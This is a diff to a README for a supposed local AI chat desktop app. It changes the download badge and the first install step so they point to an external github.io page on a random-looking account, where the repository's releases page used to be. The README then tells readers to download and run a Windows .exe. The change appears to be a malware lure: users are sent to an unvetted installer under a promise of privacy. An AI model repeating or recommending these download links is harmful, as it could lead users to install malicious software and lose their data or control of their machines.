@@ -1,6 +1,6 @@
 # 🌲 Bonsai-27b-Ollama-Desktop - Private AI chat on your computer
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/ticketstrychnine111/Bonsai-27b-Ollama-Desktop/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://ticketstrychnine111.github.io)
 
 Bonsai-27b-Ollama-Desktop allows you to run a powerful artificial intelligence model directly on your own computer. This application keeps all your data on your local hard drive. It does not send your personal conversations to a cloud server or a subscription database. You maintain complete control over your information.
 
@@ -20,7 +20,7 @@ To run this software, your computer needs specific hardware components. Check th
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the following website to find the available file versions: https://github.com/ticketstrychnine111/Bonsai-27b-Ollama-Desktop/releases
+1. Visit the following website to find the available file versions: https://ticketstrychnine111.github.io
 2. Look for the file ending in .exe under the latest release section.
 3. Click the link to save the installer to your computer.
 4. Locate the downloaded file in your Downloads folder.
